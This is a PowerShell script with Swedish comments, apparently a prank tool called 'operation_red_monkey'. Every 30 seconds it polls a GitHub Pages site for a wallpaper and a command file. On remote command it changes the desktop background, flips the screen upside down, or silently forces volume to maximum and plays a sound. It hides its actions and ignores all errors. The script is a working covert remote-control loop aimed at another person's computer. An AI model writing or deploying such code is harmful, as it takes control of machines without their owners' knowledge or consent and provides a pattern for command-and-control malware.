# Sökvägar till dina filer på GitHub Pages
$imageUrl = "https://jgerell.github.io/operation_red_monkey/wallpaper.jpg"
$commandUrl = "https://jgerell.github.io/operation_red_monkey/command.txt"
# Sökvägar för lokala filer (allt sparas i samma mapp som detta skript)
$downloadPath = "$PSScriptRoot\downloaded_wallpaper.jpg"
$currentWallpaperPath = "$PSScriptRoot\active_wallpaper.jpg"
$commandDownloadPath = "$PSScriptRoot\downloaded_command.txt"
$currentCommandPath = "$PSScriptRoot\active_command.txt"
$soundPath = "$PSScriptRoot\discord.wav"
# C#-kod som låter PowerShell prata direkt med Windows ljud- och bildsystem helt dolt
$csharpCode = @"
using System;
using System.Runtime.InteropServices;
[Guid("5CDF2C82-841E-4546-9722-0CF74078229A"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
interface IAudioEndpointVolume {
    int _0(); int _1(); int _2(); int _3();
    int SetMasterVolumeLevelScalar(float fLevel, IntPtr pEventContext);
    int _5(); int _6(); int _7(); int _8(); int _9(); int _10();
    int SetMute([MarshalAs(UnmanagedType.Bool)] bool bMute, IntPtr pEventContext);
}
[Guid("D666063F-1587-4E43-81F1-B948E807363F"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
interface IMMDevice {
    int Activate(ref Guid id, int clsCtx, int activationParams, out IAudioEndpointVolume aev);
}
[Guid("A95664D2-9614-4F35-A746-DE8DB63617E6"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
interface IMMDeviceEnumerator {
    int EnumAudioEndpoints(int dataFlow, int stateMask, IntPtr dummy);
    int GetDefaultAudioEndpoint(int dataFlow, int role, out IMMDevice endpoint);
}
[ComImport, Guid("BCDE0395-E52F-467C-8E3D-C4579291692E")] class MMDeviceEnumeratorComObject { }
public class SysTools {
    [DllImport("user32.dll", CharSet=CharSet.Auto)]
    public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);

    [DllImport("user32.dll")]
    public static extern int ChangeDisplaySettings(ref DEVMODE devMode, int flags);

    [DllImport("user32.dll")]
    public static extern bool EnumDisplaySettings(string deviceName, int modeNum, ref DEVMODE devMode);

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi)]
    public struct DEVMODE {
        [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 32)]
        public string dmDeviceName;
        public short dmSpecVersion;
        public short dmDriverVersion;
        public short dmSize;
        public short dmDriverExtra;
        public int dmFields;
        public int dmPositionX;
        public int dmPositionY;
        public int dmDisplayOrientation;
        public int dmDisplayFixedOutput;
        public short dmColor;
        public short dmDuplex;
        public short dmYResolution;
        public short dmTTOption;
        public short dmCollate;
        [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 32)]
        public string dmFormName;
        public short dmLogPixels;
        public int dmBitsPerPel;
        public int dmPelsWidth;
        public int dmPelsHeight;
        public int dmDisplayFlags;
        public int dmDisplayFrequency;
        public int dmICMMethod;
        public int dmICMIntent;
        public int dmMediaType;
        public int dmDitherType;
        public int dmReserved1;
        public int dmReserved2;
        public int dmPanningWidth;
        public int dmPanningHeight;
    }

    public static void RotateUpsideDown() {
        DEVMODE dm = new DEVMODE();
        dm.dmSize = (short)Marshal.SizeOf(typeof(DEVMODE));
        if (EnumDisplaySettings(null, -1, ref dm)) {
            if (dm.dmDisplayOrientation != 2) {
                dm.dmDisplayOrientation = 2; // 2 = 180 degrees
                ChangeDisplaySettings(ref dm, 0);
            }
        }
    }

    public static void SetVolume(float level) {
        IMMDeviceEnumerator enumerator = (IMMDeviceEnumerator)(new MMDeviceEnumeratorComObject());
        IMMDevice dev = null;
        enumerator.GetDefaultAudioEndpoint(0, 1, out dev);
        IAudioEndpointVolume epv = null;
        Guid epvid = typeof(IAudioEndpointVolume).GUID;
        dev.Activate(ref epvid, 23, 0, out epv);
        epv.SetMute(false, IntPtr.Zero); // false = unmute
        epv.SetMasterVolumeLevelScalar(level, IntPtr.Zero);
    }
}
"@
Add-Type -TypeDefinition $csharpCode
while ($true) {
    try {
        # 1. KONTROLLERA OCH UPPDATERA BAKGRUNDSBILD
        Invoke-WebRequest -Uri $imageUrl -OutFile $downloadPath -UseBasicParsing
        $shouldUpdateWallpaper = $false
        if (Test-Path $currentWallpaperPath) {
            $hashNewWall = (Get-FileHash $downloadPath).Hash
            $hashOldWall = (Get-FileHash $currentWallpaperPath).Hash
            if ($hashNewWall -ne $hashOldWall) { $shouldUpdateWallpaper = $true }
        } else {
            $shouldUpdateWallpaper = $true
        }
        if ($shouldUpdateWallpaper) {
            Copy-Item -Path $downloadPath -Destination $currentWallpaperPath -Force
            [SysTools]::SystemParametersInfo(0x0014, 0, $currentWallpaperPath, 0x01 -bor 0x02)
        }
    } catch {
        # Ignorera eventuella nätverksfel för bakgrundsbilden
    }
    try {
        # 2. KONTROLLERA TEXTFIL FÖR LJUDKOMMANDON
        Invoke-WebRequest -Uri $commandUrl -OutFile $commandDownloadPath -UseBasicParsing
        $shouldCheckCommand = $false
        if (Test-Path $currentCommandPath) {
            $hashNewCmd = (Get-FileHash $commandDownloadPath).Hash
            $hashOldCmd = (Get-FileHash $currentCommandPath).Hash
            if ($hashNewCmd -ne $hashOldCmd) { $shouldCheckCommand = $true }
        } else {
            # Första gången skriptet startar kollar vi nu kommandot och spelar ljud direkt om det är 1 eller 2!
            $shouldCheckCommand = $true
        }
        if ($shouldCheckCommand) {
            # Läs texten i filen och ta bort eventuella osynliga radbrytningar
            $command = (Get-Content -Path $commandDownloadPath -Raw).Trim()
            if ($command -eq "1" -or $command -eq "2" -or $command -eq "3") {
                if ($command -eq "3") {
                    try {
                        [SysTools]::RotateUpsideDown()
                    } catch {
                        # Ignorera fel vid rotering
                    }
                } else {
                    try {
                        # Höj volymen till 100% helt osynligt utan popup-ruta
                        [SysTools]::SetVolume(1.0)
                    } catch {
                        # Ignorera om volymen inte kan ändras (t.ex. om inga högtalare är inkopplade)
                    }
                    Start-Sleep -Milliseconds 500
                    try {
                        if ($command -eq "1") {
                            # Spela den lokala discord.wav-filen om den existerar
                            if (Test-Path $soundPath) {
                                $soundPlayer = New-Object System.Media.SoundPlayer
                                $soundPlayer.SoundLocation = $soundPath
                                $soundPlayer.Play()
                            }
                        } elseif ($command -eq "2") {
                            # Spela Windows vanliga notifikationsljud (Exclamation)
                            [System.Media.SystemSounds]::Exclamation.Play()
                        }
                    } catch {
                        # Ignorera om ljudet inte kan spelas upp
                    }
                }
            }
            # Uppdatera den lokala kontrollfilen så kommandot bara körs en gång per ändring
            Copy-Item -Path $commandDownloadPath -Destination $currentCommandPath -Force
        }
    } catch {
        # Ignorera eventuella nätverksfel eller ljudfel
    }
    # Vänta 30 sekunder innan nästa kontroll av både bild och textfil
    Start-Sleep -Seconds 30
}